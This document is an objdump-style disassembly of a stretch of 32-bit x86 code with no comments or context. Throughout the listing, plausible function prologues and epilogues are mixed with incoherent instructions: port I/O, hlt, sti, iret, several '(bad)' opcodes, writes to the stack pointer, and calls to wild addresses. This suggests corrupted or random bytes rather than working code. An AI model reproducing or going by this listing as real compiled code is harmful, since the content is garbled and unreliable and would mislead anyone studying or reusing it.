  404f90:	8b 5d 41             	mov    0x41(%ebp),%ebx
  404f93:	cb                   	lret
  404f94:	57                   	push   %edi
  404f95:	85 db                	test   %ebx,%ebx
  404f97:	75 03                	jne    0x404f9c
  404f99:	8b 58 18             	mov    0x18(%eax),%ebx
  404f9c:	8b 03                	mov    (%ebx),%eax
  404f9e:	bf 01 00 00 cd       	mov    $0xcd000001,%edi
  404fa3:	3b c7                	cmp    %edi,%eax
  404fa5:	72 57                	jb     0x404ffe
  404fa7:	8b e3                	mov    %ebx,%esp
  404fa9:	0c 85                	or     $0x85,%al
  404fab:	bb 74 06 50 cf       	mov    $0xcf500674,%ebx
  404fb0:	bf 53 2a 00 25       	mov    $0x25002a53,%edi
  404fb5:	64 18 8b 0b 31 43 18 	sbb    %cl,%fs:0x1843310b(%ebx)
  404fbc:	8b eb                	mov    %ebx,%ebp
  404fbe:	85 f6                	test   %esi,%esi
  404fc0:	75 0f                	jne    0x404fd1
  404fc2:	b9 d1 9c 0b 8b       	mov    $0x8b0b9cd1,%ecx
  404fc7:	aa                   	stos   %al,%es:(%edi)
  404fc8:	04 83                	add    $0x83,%al
  404fca:	c0 04 1e 85          	rolb   $0x85,(%esi,%ebx,1)
  404fce:	f6 cc f1             	test   $0xf1,%ah
  404fd1:	52                   	push   %edx
  404fd2:	30 85 f6 74 98 a1    	xor    %al,-0x5e678b0a(%ebp)
  404fd8:	3e 85 e6             	ds test %esp,%esi
  404fdb:	89 38                	mov    %edi,(%eax)
  404fdd:	0f 85 95 00 10 00    	jne    0x505078
  404fe3:	3b ba 0f d0 82 9b    	cmp    -0x647d2ff1(%edx),%edi
  404fe9:	00 00                	add    %al,(%eax)
  404feb:	8b 50 fc             	mov    -0x4(%eax),%edx
  404fee:	6d                   	insl   (%dx),%es:(%edi)
  404fef:	e8 ee 49 85 d2       	call   0xd2c599e2
  404ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ff5:	04 39                	add    $0x39,%al
  404ff7:	c9                   	leave
  404ff8:	99                   	cltd
  404ff9:	f1                   	int1
  404ffa:	89 e1                	mov    %esp,%ecx
  404ffc:	eb 6f                	jmp    0x40506d
  404ffe:	8b 43 b4             	mov    -0x4c(%ebx),%eax
  405001:	8d 73 14             	lea    0x14(%ebx),%esi
  405004:	85 c0                	test   %eax,%eax
  405006:	74 7b                	je     0x405083
  405008:	8b 43 0c             	mov    0xc(%ebx),%eax
  40500b:	95                   	xchg   %eax,%ebp
  40500c:	c0 74 06 50 e8       	shlb   $0xe8,0x50(%esi,%eax,1)
  405011:	86 52 00             	xchg   %dl,0x0(%edx)
  405014:	00 8b c6 8b ca 4b    	add    %cl,0x4bca8bc6(%ebx)
  40501a:	f6 74 0d 39          	divb   0x39(%ebp,%ecx,1)
  40501e:	7e 08                	jle    0x405028
  405020:	e7 47                	out    %eax,$0x47
  405022:	8b e0                	mov    %eax,%esp
  405024:	8b 36                	mov    (%esi),%esi
  405026:	85 dc                	test   %ebx,%esp
  405028:	75 f3                	jne    0x40501d
  40502a:	8b 0a                	mov    (%edx),%ecx
  40502c:	0c 85                	or     $0x85,%al
  40502e:	c0 74 06 dc e8       	shlb   $0xe8,-0x24(%esi,%eax,1)
  405033:	20 53 00             	and    %dl,0x0(%ebx)
  405036:	00 68 00             	add    %ch,0x0(%eax)
  405039:	20 00                	and    %al,(%eax)
  40503b:	00 ff                	add    %bh,%bh
  40503d:	15 5c c1 40 00       	adc    $0x40c15c,%eax
  405042:	8b f0                	mov    %eax,%esi
  405044:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405045:	c4 04 85 f6 0f 84 d9 	les    -0x267bf00a(,%eax,4),%eax
  40504c:	00 00                	add    %al,(%eax)
  40504e:	00 8d 56 74 8d ee    	add    %cl,-0x11728baa(%ebp)
  405054:	00 05 00 00 c7 90    	add    %al,0x90c70000
  40505a:	00 00                	add    %al,(%eax)
  40505c:	53                   	push   %ebx
  40505d:	92                   	xchg   %eax,%edx
  40505e:	89 e0                	mov    %esp,%eax
  405060:	08 89 56 e7 89 46    	or     %cl,0x4689e756(%ecx)
  405066:	14 eb                	adc    $0xeb,%al
  405068:	34 8b                	xor    $0x8b,%al
  40506a:	16                   	push   %ss
  40506b:	89 10                	mov    %edx,(%eax)
  40506d:	8b 7b 08             	mov    0x8(%ebx),%edi
  405070:	27                   	daa
  405071:	ca 08 de             	lret   $0xde08
  405074:	f8                   	clc
  405075:	8b 4c 04 f3          	mov    -0xd(%esp,%eax,1),%ecx
  405079:	cf                   	iret
  40507a:	89 7b 08             	mov    %edi,0x8(%ebx)
  40507d:	3b c8                	cmp    %eax,%ecx
  40507f:	76 a1                	jbe    0x405022
  405081:	89 43 6a             	mov    %eax,0x6a(%ebx)
  405084:	8b 43 0c             	mov    0xc(%ebx),%eax
  405087:	85 5b 74             	test   %ebx,0x74(%ebx)
  40508a:	06                   	push   %es
  40508b:	50                   	push   %eax
  40508c:	e8 af 52 e5 fa       	call   0xfb25a340
  405091:	8d 4e 18             	lea    0x18(%esi),%ecx
  405094:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40509a:	89 4e 10             	mov    %ecx,0x10(%esi)
  40509d:	8b 45 10             	mov    0x10(%ebp),%eax
  4050a0:	77 7f                	ja     0x405121
  4050a2:	10 89 36 89 76 fa    	adc    %cl,-0x58976ca(%ecx)
  4050a8:	05 38 40 89 b9       	add    $0xb9894038,%eax
  4050ad:	5a                   	pop    %edx
  4050ae:	89 46 10             	mov    %eax,0x10(%esi)
  4050b1:	89 5f e0             	mov    %ebx,-0x20(%edi)
  4050b4:	8b 91 0c 45 77 30    	mov    0x3077450c(%ecx),%edx
  4050ba:	89 77 2c             	mov    %esi,0x2c(%edi)
  4050bd:	b4 d3                	mov    $0xd3,%ah
  4050bf:	66 4f                	dec    %di
  4050c1:	20 62 de             	and    %ah,-0x22(%edx)
  4050c4:	70 77                	jo     0x40513d
  4050c6:	04 89                	add    $0x89,%al
  4050c8:	77 10                	ja     0x4050da
  4050ca:	2f                   	das
  4050cb:	77 14                	ja     0x4050e1
  4050cd:	89 77 44             	mov    %esi,0x44(%edi)
  4050d0:	89 77 3c             	mov    %esi,0x3c(%edi)
  4050d3:	89 77 1c             	mov    %esi,0x1c(%edi)
  4050d6:	89 77 24             	mov    %esi,0x24(%edi)
  4050d9:	89 77 28             	mov    %esi,0x28(%edi)
  4050dc:	89 1f                	mov    %ebx,(%edi)
  4050de:	74 62                	je     0x405142
  4050e0:	68 53 18 52 d3       	push   $0xd3521853
  4050e5:	1e                   	push   %ds
  4050e6:	f8                   	clc
  4050e7:	ff                   	(bad)
  4050e8:	ff                   	(bad)
  4050e9:	3b c6                	cmp    %esi,%eax
  4050eb:	c1 45 10 5d          	roll   $0x5d,0x10(%ebp)
  4050ef:	09 50 e8             	or     %edx,-0x18(%eax)
  4050f2:	da 51 00             	ficoml 0x0(%ecx)
  4050f5:	00 8b 45 10 2e 12    	add    %cl,0x122e1045(%ebx)
  4050fb:	04 5f                	add    $0x5f,%al
  4050fd:	c3                   	ret
  4050fe:	04 8d                	add    $0x8d,%al
  405100:	57                   	push   %edi
  405101:	08 3b                	or     %bh,(%ebx)
  405103:	25 89 ab 7a 03       	and    $0x37aab89,%eax
  405108:	55                   	push   %ebp
  405109:	63 05 fe 3b 3b bb    	arpl   %eax,0xbb3b3bfe
  40510f:	3c 26                	cmp    $0x26,%al
  405111:	0c 74                	or     $0x74,%al
  405113:	34 50                	xor    $0x50,%al
  405115:	e8 97 91 00 00       	call   0x40e2b1
  40511a:	8b 45 08             	mov    0x8(%ebp),%eax
  40511d:	95                   	xchg   %eax,%ebp
  40511e:	38 5f 5e             	cmp    %bl,0x5e(%edi)
  405121:	33 c0                	xor    %eax,%eax
  405123:	5b                   	pop    %ebx
  405124:	5d                   	pop    %ebp
  405125:	c2 e4 00             	ret    $0xe4
  405128:	8b 45 10             	mov    0x10(%ebp),%eax
  40512b:	85 c0                	test   %eax,%eax
  40512d:	01 07                	add    %eax,(%edi)
  40512f:	c1 0c ff d0          	rorl   $0xd0,(%edi,%edi,8)
  405133:	83 c4 04             	add    $0x4,%esp
  405136:	5f                   	pop    %edi
  405137:	5e                   	pop    %esi
  405138:	b8 0c 00 00 00       	mov    $0xc,%eax
  40513d:	fb                   	sti
  40513e:	86 c2                	xchg   %al,%dl
  405140:	c7                   	(bad)
  405141:	51                   	push   %ecx
  405142:	09 1c 08             	or     %ebx,(%eax,%ecx,1)
  405145:	89 77 0c             	mov    %esi,0xc(%edi)
  405148:	8b 45 08             	mov    0x8(%ebp),%eax
  40514b:	89 38                	mov    %edi,(%eax)
  40514d:	5f                   	pop    %edi
  40514e:	5e                   	pop    %esi
  40514f:	33 c0                	xor    %eax,%eax
  405151:	5b                   	pop    %ebx
  405152:	5d                   	pop    %ebp
  405153:	80 10 00             	adcb   $0x0,(%eax)
  405156:	ec                   	in     (%dx),%al
  405157:	90                   	nop
  405158:	90                   	nop
  405159:	90                   	nop
  40515a:	90                   	nop
  40515b:	90                   	nop
  40515c:	90                   	nop
  40515d:	90                   	nop
  40515e:	90                   	nop
  40515f:	90                   	nop
  405160:	55                   	push   %ebp
  405161:	a8 ec                	test   $0xec,%al
  405163:	83 ec 61             	sub    $0x61,%esp
  405166:	43                   	inc    %ebx
  405167:	56                   	push   %esi
  405168:	57                   	push   %edi
  405169:	8b 7d 08             	mov    0x8(%ebp),%edi
  40516c:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40516f:	33 db                	xor    %ebx,%ebx
  405171:	8b 47 56             	mov    0x56(%edi),%eax
  405174:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405177:	8b 7d 10             	mov    0x10(%ebp),%edi
  40517a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40517d:	8b 50 14             	mov    0x14(%eax),%edx
  405180:	7b c6                	jnp    0x405148
  405182:	45                   	inc    %ebp
  405183:	50                   	push   %eax
  405184:	00 89 a7 e3 89 5d    	add    %cl,0x5d89e3a7(%ecx)
  40518a:	f4                   	hlt
  40518b:	8b 48 10             	mov    0x10(%eax),%ecx
  40518e:	4a                   	dec    %edx
  40518f:	50                   	push   %eax
  405190:	14 3b                	adc    $0x3b,%al
  405192:	ca 75 2a             	lret   $0x2a75
  405195:	8d 55 e0             	lea    -0x20(%ebp),%edx
  405198:	52                   	push   %edx
  405199:	e8 a2 01 00 00       	call   0x405340
  40519e:	83 c4 04             	add    $0x4,%esp
  4051a1:	83 6f ff 75          	subl   $0x75,-0x1(%edi)
  4051a5:	19 8b 47 20 3b e7    	sbb    %ecx,-0x18c4dfb9(%ebx)
  4051ab:	b9 3b e4 0c ff       	mov    $0xff0ce43b,%ecx
  4051b0:	22 83 c4 47 33 c0    	and    -0x3fccb83c(%ebx),%al
  4051b6:	5f                   	pop    %edi
  4051b7:	5e                   	pop    %esi
  4051b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4051b9:	d4 e5                	aam    $0xe5
  4051bb:	5d                   	pop    %ebp
  4051bc:	c2 0c 00             	ret    $0xc
  4051bf:	8b 45 10             	mov    0x10(%ebp),%eax
  4051c2:	8b 37                	mov    (%edi),%esi
  4051c4:	bc 50 8d 55 e0       	mov    $0xe0558d50,%esp
  4051c9:	51                   	push   %ecx
  4051ca:	52                   	push   %edx
  4051cb:	68 40 53 40 f6       	push   $0xf6405340
  4051d0:	e8 fb 1a 00 9f       	call   0x9f406cd0
  4051d5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051d8:	75 be                	jne    0x405198
  4051da:	8b 47 20             	mov    0x20(%edi),%eax
  4051dd:	3b 04 74             	cmp    (%esp,%esi,2),%eax
  4051e0:	07                   	pop    %es
  4051e1:	6a 0c                	push   $0xc
  4051e3:	ff d0                	call   *%eax
  4051e5:	83 c4 04             	add    $0x4,%esp
  4051e8:	c0 5e e1 c0          	rcrb   $0xc0,-0x1f(%esi)
  4051ec:	be 8b e5 5d c2       	mov    $0xc25de58b,%esi
  4051f1:	9d                   	popf
  4051f2:	00 8b 4f e0 c6 00    	add    %cl,0xc6e04f(%ebx)
  4051f8:	00 8b 4d e8 8b 51    	add    %cl,0x518be84d(%ebx)
  4051fe:	10 2b                	adc    %ch,(%ebx)
  405200:	c2 6d 55             	ret    $0x556d
  405203:	10 83 c0 0d 24 f8    	adc    %al,-0x7dbf240(%ebx)
  405209:	2a c2                	sub    %dl,%al
  40520b:	89 8d 10 8b 75 f4    	mov    %ecx,-0xb8a74f0(%ebp)
  405211:	3b f3                	cmp    %ebx,%esi
  405213:	0f e7 a0 00 72 00 8b 	movntq %mm4,-0x74ff8e00(%eax)
  40521a:	7f 18                	jg     0x405234
  40521c:	8b 47 0c             	mov    0xc(%edi),%eax
  40521f:	85 c0                	test   %eax,%eax
  405221:	f9                   	stc
  405222:	06                   	push   %es
  405223:	50                   	push   %eax
  405224:	e8 a6 50 00 00       	call   0x40a2cf
  405229:	8b ad 04 8b 0f 89    	mov    -0x76f074fc(%ebp),%ebp
  40522f:	55                   	push   %ebp
  405230:	d4 8b                	aam    $0x8b
  405232:	d1 26                	shll   $1,(%esi)
  405234:	89 be 0c 8b c9 dd    	mov    %edi,-0x223674f4(%esi)
  40523a:	66 fc                	data16 cld
  40523c:	89 60 f8             	mov    %esp,-0x8(%eax)
  40523f:	8b 46 08             	mov    0x8(%esi),%eax
  405242:	85 c9                	test   %ecx,%ecx
  405244:	74 0a                	je     0x405250
  405246:	3b c2                	cmp    %edx,%eax
  405248:	76 06                	jbe    0x405250
  40524a:	89 1e                	mov    %ebx,(%esi)
  40524c:	84 2c eb             	test   %ch,(%ebx,%ebp,8)
  40524f:	2f                   	das
  405250:	83 f8 14             	cmp    $0x14,%eax
  405253:	73 78                	jae    0x4052cd
  405255:	8b 4c 87 26          	mov    0x26(%edi,%eax,4),%ecx
  405259:	85 c9                	test   %ecx,%ecx
  40525b:	07                   	pop    %es
  40525c:	0e                   	push   %cs
  40525d:	75 08                	jne    0x405267
  40525f:	3b f5                	cmp    %ebp,%esi
  405261:	0c 76                	or     $0x76,%al
  405263:	03 89 45 0c 89 14    	add    0x14890c45(%ecx),%ecx
  405269:	87 14 eb             	xchg   %edx,(%ebx,%ebp,8)
  40526c:	08 8b b1 14 89 0e    	or     %cl,0xe8914b1(%ebx)
  405272:	89 77 14             	mov    %esi,0x14(%edi)
  405275:	67 13 72 04          	adc    0x4(%bp,%si),%esi
  405279:	2b d0                	sub    %eax,%edx
  40527b:	eb 02                	jmp    0x40527f
  40527d:	33 45 91             	xor    -0x6f(%ebp),%eax
  405280:	75 f8                	jne    0x40527a
  405282:	dc 38                	fdivrl (%eax)
  405284:	75 b1                	jne    0x405237
  405286:	8b 45 0c             	mov    0xc(%ebp),%eax
  405289:	89 57 08             	mov    %edx,0x8(%edi)
  40528c:	89 07                	mov    %eax,(%edi)
  40528e:	8b 7f 0c             	mov    0xc(%edi),%edi
  405291:	85 ff                	test   %edi,%edi
  405293:	74 76                	je     0x40530b
  405295:	49                   	dec    %ecx
  405296:	e8 7b 53 00 00       	call   0x40a616
  40529b:	85 db                	test   %ebx,%ebx
  40529d:	74 a0                	je     0x40523f
  40529f:	39 35 30 78 6f 62    	cmp    %esi,0x626f7830
  4052a5:	8b c3                	mov    %ebx,%eax
  4052a7:	8b 1b                	mov    (%ebx),%ebx
  4052a9:	50                   	push   %eax
  4052aa:	ff d6                	call   *%esi
  4052ac:	21 c4                	and    %eax,%esp
  4052ae:	04 85                	add    $0x85,%al
  4052b0:	ce                   	into
  4052b1:	75 f2                	jne    0x4052a5
  4052b3:	8b 55 b3             	mov    -0x4d(%ebp),%edx
  4052b6:	8b 7d 40             	mov    0x40(%ebp),%edi
  4052b9:	8a 45 f0             	mov    -0x10(%ebp),%al
  4052bc:	84 c0                	test   %al,%al
  4052be:	75 0b                	jne    0x4052cb
  4052c0:	5f                   	pop    %edi
  4052c1:	5e                   	pop    %esi
  4052c2:	8b 7f e9             	mov    -0x17(%edi),%edi
  4052c5:	26 e5 5d             	es in  $0x5d,%eax
  4052c8:	c2 0c 00             	ret    $0xc
  4052cb:	8b f6                	mov    %esi,%esi
  4052cd:	e8 c8 47 2c c7       	call   0xc76c9a9a
  4052d2:	41                   	inc    %ecx
  4052d3:	0c 00                	or     $0x0,%al
  4052d5:	00 d0                	add    %dl,%al
  4052d7:	c7                   	(bad)
  4052d8:	8b 50 04             	mov    0x4(%eax),%edx
  4052db:	89 ab 04 89 0a fa    	mov    %ebp,-0x5f576fc(%ebx)
  4052e1:	01 89 5c 3b 89 4f    	add    %ecx,0x4f893b5c(%ecx)
  4052e7:	2c 8b                	sub    $0x8b,%al
  4052e9:	69 14 8b 58 89 8b 30 	imul   $0x308b8958,(%ebx,%ecx,4),%edx
  4052f0:	2b cb                	sub    %ebx,%ecx
  4052f2:	81 55 00 10 00 2c 8b 	adcl   $0x8b2c0010,0x0(%ebp)
  4052f9:	ad                   	lods   %ds:(%esi),%eax
  4052fa:	81 b0 00 f0 ff ff 49 	xorl   $0xcf96949,-0x1000(%eax)
  405301:	69 f9 0c 
  405304:	ae                   	scas   %es:(%edi),%al
  405305:	48                   	dec    %eax
  405306:	0c 8b                	or     $0x8b,%al
  405308:	7a 0c                	jp     0x405316
  40530a:	3b cf                	cmp    %edi,%ecx
  40530c:	73 21                	jae    0x40532f
  40530e:	8b 12                	mov    (%edx),%edx
  405310:	a2 4a 0c 93 f9       	mov    %al,0xf9930c4a
  405315:	8b 48 04             	mov    0x4(%eax),%ecx
  405318:	89 31                	mov    %esi,(%ecx)
  40531a:	8b 08                	mov    (%eax),%ecx
  40531c:	8b 70 04             	mov    0x4(%eax),%esi
  40531f:	89 71 04             	mov    %esi,0x4(%ecx)
  405322:	8b 4a 78             	mov    0x78(%edx),%ecx
  405325:	89 59 04             	mov    %ebx,0x4(%ecx)
  405328:	89 01                	mov    %eax,(%ecx)
  40532a:	89 c1                	mov    %eax,%ecx
  40532c:	89 9b 04 8b 45 10    	mov    %ebx,0x10458b04(%ebx)
  405332:	5f                   	pop    %edi
  405333:	5e                   	pop    %esi
  405334:	5b                   	pop    %ebx
  405335:	05 e5 a0 c2 0c       	add    $0xcc2a0e5,%eax
  40533a:	00 a1 90 90 90 90    	add    %ah,-0x6f6f6f70(%ecx)
  405340:	55                   	push   %ebp
  405341:	8b ec                	mov    %esp,%ebp
  405343:	83 ec 10             	sub    $0x10,%esp
  405346:	ee                   	out    %al,(%dx)
  405347:	55                   	push   %ebp
  405348:	08 53 56             	or     %dl,0x56(%ebx)
  40534b:	57                   	push   %edi
  40534c:	8b 5a 08             	mov    0x8(%edx),%ebx
  40534f:	8b 02                	mov    (%edx),%eax
  405351:	16                   	push   %ss
  405352:	7a 91                	jp     0x4052e5
  405354:	2b 81 19 89 45 f4    	sub    -0xbba76e7(%ecx),%eax
  40535a:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  40535d:	83 f9 20             	cmp    $0x20,%ecx
  405360:	73 05                	jae    0x405367
  405362:	c2 20 00             	ret    $0x20
  405365:	00 00                	add    %al,(%eax)
  405367:	31 61 10             	xor    %esp,0x10(%ecx)
  40536a:	00 11                	add    %dl,(%ecx)
  40536c:	03 63 7b             	add    0x7b(%ebx),%esp
  40536f:	8b 06                	mov    (%esi),%eax
  405371:	14 2b                	adc    $0x2b,%al
  405373:	70 10                	jo     0x405385
  405375:	3b ce                	cmp    %esi,%ecx
  405377:	ee                   	out    %al,(%dx)
  405378:	11 c7                	adc    %eax,%edi
  40537a:	48                   	dec    %eax
  40537b:	57                   	push   %edi
  40537c:	8b 71 89             	mov    -0x77(%ecx),%esi
  40537f:	31 8b 08 8b 70 04    	xor    %ecx,0x4708b08(%ebx)
  405385:	89 71 04             	mov    %esi,0x4(%ecx)
  405388:	8b 54 04 89          	mov    -0x77(%esp,%eax,1),%edx
  40538c:	48                   	dec    %eax
  40538d:	04 89                	add    $0x89,%al
  40538f:	01 7d 18             	add    %edi,0x18(%ebp)
  405392:	61                   	popa
  405393:	d6                   	salc
  405394:	ff f3                	push   %ebx
  405396:	40                   	inc    %eax
  405397:	0c 08                	or     $0x8,%al
  405399:	00 00                	add    %al,(%eax)
  40539b:	ce                   	into
  40539c:	89 73 2c             	mov    %esi,0x2c(%ebx)
  40539f:	8b a7 14 8b 4b 10    	mov    0x104b8b14(%edi),%esp
  4053a5:	38 33                	cmp    %dh,(%ebx)
  4053a7:	79 0d                	jns    0x4053b6
  4053a9:	8b ce                	mov    %esi,%ecx
  4053ab:	05 76 10 e8 61       	add    $0x61e81076,%eax
  4053b0:	fb                   	sti
  4053b1:	00 93 76 ff 48 c1    	add    %dl,-0x3eb7008a(%ebx)
  4053b7:	53                   	push   %ebx
  4053b8:	0c 9e                	or     $0x9e,%al
  4053ba:	43                   	inc    %ebx
  4053bb:	0c 3b                	or     $0x3b,%al
  4053bd:	41                   	inc    %ecx
  4053be:	0c a3                	or     $0xa3,%al
  4053c0:	21 b8 09 1d 41 55    	and    %edi,0x55411d09(%eax)
  4053c6:	72 f9                	jb     0x4053c1
  4053c8:	8b 43 04             	mov    0x4(%ebx),%eax
  4053cb:	89 30                	mov    %esi,(%eax)
  4053cd:	8b 03                	mov    (%ebx),%eax
  4053cf:	8b 73 04             	mov    0x4(%ebx),%esi
  4053d2:	89 a4 04 8b 41 04 89 	mov    %esp,-0x76fbbe75(%esp,%eax,1)
  4053d9:	43                   	inc    %ebx
  4053da:	04 89                	add    $0x89,%al
  4053dc:	48                   	dec    %eax
  4053dd:	2a 0b                	sub    (%ebx),%cl
  4053df:	89 59 04             	mov    %ebx,0x4(%ecx)
  4053e2:	8b 47 2c             	mov    0x2c(%edi),%eax
  4053e5:	e9 56 3b 00 dc       	jmp    0xdc408f40
  4053ea:	8b 77 5a             	mov    0x5a(%edi),%esi
  4053ed:	c0 81 17 10 00 b3 25 	rolb   $0x25,-0x4cffefe9(%ecx)
  4053f4:	00 f0                	add    %dh,%al
  4053f6:	ff                   	(bad)
  4053f7:	ff                   	(bad)
  4053f8:	3b c1                	cmp    %ecx,%eax
  4053fa:	89 f7                	mov    %esi,%edi
  4053fc:	fc                   	cld
  4053fd:	0f 86 bd 8e 00 11    	jbe    0x1140e2c0
  405403:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405404:	00 20                	add    %ah,(%eax)
  405406:	00 00                	add    %al,(%eax)
  405408:	73 0a                	jae    0x405414
  40540a:	c7 45 fc 40 20 e0 00 	movl   $0xe02040,-0x4(%ebp)
  405411:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405414:	8b a4 c1 6d 0c 4f 83 	mov    -0x7cb0f393(%ecx,%eax,8),%esp
  40541b:	ff 01                	incl   (%ecx)
  40541d:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405420:	5a                   	pop    %edx
  405421:	87 9a 01 35 00 3b    	xchg   %ebx,0x3b003501(%edx)
  405427:	3e 0f f2 e7          	ds pslld %mm7,%mm4
  40542b:	00 00                	add    %al,(%eax)
  40542d:	00 8b f6 0c 85 c0    	add    %cl,-0x3f7af30a(%ebx)
  405433:	74 06                	je     0x40543b
  405435:	50                   	push   %eax
  405436:	e8 95 4e 00 00       	call   0x40a2d0
  40543b:	83 7c be 14 00       	cmpl   $0x0,0x14(%esi,%edi,4)
  405440:	8b 59 8d             	mov    -0x73(%ecx),%ebx
  405443:	0b be 14 8b d7 89    	or     -0x762874ec(%esi),%edi
  405449:	55                   	push   %ebp
  40544a:	f8                   	clc
  40544b:	75 10                	jne    0x40545d
  40544d:	3b 98 44 09 83 c0    	cmp    -0x3f7cf6bc(%eax),%ebx
  405453:	04 42                	add    $0x42,%al
  405455:	83 38 00             	cmpl   $0x0,(%eax)
  405458:	74 f3                	je     0x40544d
  40545a:	89 55 4e             	mov    %edx,0x4e(%ebp)
  40545d:	8b 10                	mov    (%eax),%edx
  40545f:	85 e9                	test   %ebp,%ecx
  405461:	89 55 f0             	mov    %edx,-0x10(%ebp)
  405464:	0f 84 a3 00 00 00    	je     0x40550d
  40546a:	8b 3a                	mov    (%edx),%edi
  40546c:	85 ff                	test   %edi,%edi
  40546e:	0c 38                	or     $0x38,%al
  405470:	88 16                	mov    %dl,(%esi)
  405472:	39 4d f8             	cmp    %ecx,-0x8(%ebp)
  405475:	72 bb                	jb     0x405432
  405477:	8b 0e                	mov    (%esi),%ecx
  405479:	fc                   	cld
  40547a:	9b                   	fwait
  40547b:	e8 04 e4 85 ff       	call   0xffc63884
  405480:	09 04 85 c9 77 f1 6b 	or     %eax,0x6bf177c9(,%eax,4)
  405487:	0e                   	push   %cs
  405488:	8b 4a 99             	mov    -0x67(%edx),%ecx
  40548b:	8b 46 08             	mov    0x8(%esi),%eax
  40548e:	46                   	inc    %esi
  40548f:	c1 89 46 08 8b c8 8b 	rorl   $0x8b,-0x3774f7ba(%ecx)
  405496:	46                   	inc    %esi
  405497:	04 0d                	add    $0xd,%al
  405499:	c8 76 20 89          	enter  $0x2076,$0x89
  40549d:	46                   	inc    %esi
  40549e:	8c 8b 76 0c 85 f6    	mov    %cs,-0x97af38a(%ebx)
  4054a4:	74 09                	je     0x4054af
  4054a6:	56                   	push   %esi
  4054a7:	0d 94 4e 60 00       	or     $0x604e94,%eax
  4054ac:	8b 55 28             	mov    0x28(%ebp),%edx
  4054af:	8d 42 18             	lea    0x18(%edx),%eax
  4054b2:	c7                   	(bad)
  4054b3:	63 00                	arpl   %eax,(%eax)
  4054b5:	00 00                	add    %al,(%eax)
  4054b7:	00 89 f0 10 8b c2    	add    %cl,-0x3d74ef10(%ecx)
  4054bd:	8b 55 08             	mov    0x8(%ebp),%edx
  4054c0:	8a 4a 10             	mov    0x10(%edx),%cl
  4054c3:	84 c9                	test   %cl,%cl
  4054c5:	74 08                	je     0x4054cf
  4054c7:	8b 4a 14             	mov    0x14(%edx),%ecx
  4054ca:	89 0b                	mov    %ecx,(%ebx)
  4054cc:	89 76 14             	mov    %esi,0x14(%esi)
  4054cf:	c6 42 10 01          	movb   $0x1,0x10(%edx)
  4054d3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4054d6:	8b 01                	mov    (%ecx),%eax
  4054d8:	aa                   	stos   %al,%es:(%edi)
  4054d9:	8b 78 10             	mov    0x10(%eax),%edi
  4054dc:	3b d9                	cmp    %ecx,%ebx
  4054de:	c1 4c 02 f3 a5       	rorl   $0xa5,-0xd(%edx,%eax,1)
  4054e3:	8b cb                	mov    %ebx,%ecx
  4054e5:	83 e1 03             	and    $0x3,%ecx
  4054e8:	f3 d0 89 42 ce a0 97 	repz rorb $1,-0x685f31be(%ecx)
  4054ef:	10 8b f3 5f 03 ce    	adc    %cl,-0x31fca00d(%ebx)
  4054f5:	5e                   	pop    %esi
  4054f6:	89 0a                	mov    %ecx,(%edx)
  4054f8:	8b 40 14             	mov    0x14(%eax),%eax
  4054fb:	48                   	dec    %eax
  4054fc:	5b                   	pop    %ebx
  4054fd:	89 42 04             	mov    %eax,0x4(%edx)
  405500:	33 e3                	xor    %ebx,%esp
  405502:	8b e5                	mov    %ebp,%esp
  405504:	5d                   	pop    %ebp
  405505:	08 88 76 be 85 f6    	or     %cl,-0x97a418a(%eax)
  40550b:	74 49                	je     0x405556
  40550d:	28 5e 2d             	sub    %bl,0x2d(%esi)
  405510:	4e                   	dec    %esi
  405511:	00 00                	add    %al,(%eax)
  405513:	eb 41                	jmp    0x405556
  405515:	8b 4e 14             	mov    0x14(%esi),%ecx
  405518:	85 c9                	test   %ecx,%ecx
  40551a:	74 3d                	je     0x405559
  40551c:	8b 46 07             	mov    0x7(%esi),%eax
  40551f:	85 c0                	test   %eax,%eax
  405521:	74 09                	je     0x40552c
  405523:	50                   	push   %eax
  405524:	e8 a7 4d 65 00       	call   0xa5a2d0
  405529:	8b 55 08             	mov    0x8(%ebp),%edx
  40552c:	b9 7e 14 8d 46       	mov    $0x468d147e,%ecx
  405531:	14 85                	adc    $0x85,%al
  405533:	ff 74 10 8b          	push   -0x75(%eax,%edx,1)
  405537:	fd                   	std
  405538:	6c                   	insb   (%dx),%es:(%edi)
  405539:	3b 4f ba             	cmp    -0x46(%edi),%ecx
  40553c:	76 46                	jbe    0x405584
  40553e:	8b c7                	mov    %edi,%eax
  405540:	83 3f 85             	cmpl   $0xffffff85,(%edi)
  405543:	ff 75 f0             	push   -0x10(%ebp)
  405546:	8b 76 0c             	mov    0xc(%esi),%esi
  405549:	85 17                	test   %edx,(%edi)
  40554b:	74 06                	je     0x405553
  40554d:	56                   	push   %esi
  40554e:	c7                   	(bad)
  40554f:	ed                   	in     (%dx),%eax
  405550:	4d                   	dec    %ebp
  405551:	00 00                	add    %al,(%eax)
  405553:	8b 7d f8             	mov    -0x8(%ebp),%edi
  405556:	8b 34 fc             	mov    (%esp,%edi,8),%esi
  405559:	50                   	push   %eax
  40555a:	ff 15 5c c3 40 00    	call   *0x40c35c
  405560:	83 68 04 85          	subl   $0xffffff85,0x4(%eax)
  405564:	c0 74 74 ca 4d       	shlb   $0x4d,-0x36(%esp,%esi,2)
  405569:	fc                   	cld
  40556a:	8d 50 36             	lea    0x36(%eax),%edx
  40556d:	89 50 10             	mov    %edx,0x10(%eax)
  405570:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405576:	8d 14 04             	lea    (%esp,%eax,1),%edx
  405579:	89 78 08             	mov    %edi,0x8(%eax)
  40557c:	fc                   	cld
  40557d:	50                   	push   %eax
  40557e:	14 e9                	adc    $0xe9,%al
  405580:	39 ff                	cmp    %edi,%edi
  405582:	ff 55 8b             	call   *-0x75(%ebp)
  405585:	27                   	daa
  405586:	89 08                	mov    %ecx,(%eax)
  405588:	8b 47 08             	mov    0x8(%edi),%eax
